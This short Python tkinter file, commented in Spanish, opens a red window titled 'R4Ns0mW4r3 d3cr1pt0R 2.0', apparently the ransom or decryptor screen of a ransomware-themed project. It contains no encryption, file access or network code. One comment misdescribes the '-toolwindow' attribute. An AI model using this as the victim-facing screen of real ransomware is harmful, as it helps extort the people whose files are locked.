#Librería para los elementos de la GUI.
import tkinter as tk  	

class rescueWindow(object):
    Ventana = tk.Tk()

    def __init__(self):	#Constructor.
        self.crearVentana()	#Llamada al método crearVentana.
    
    def crearVentana(self):	#Método para crear la ventana.
        self.Ventana.title("R4Ns0mW4r3 d3cr1pt0R 2.0")	#Título de la ventana.
        self.Ventana.attributes('-toolwindow', True) #No permite modificar atributos de la ventana.
        self.Ventana.geometry("750x750+300+50")	#Tamaño de la ventana.
        self.Ventana.configure(bg = "Red")		#Color de fondo.
        self.Ventana.mainloop()		#Muestra la ventana.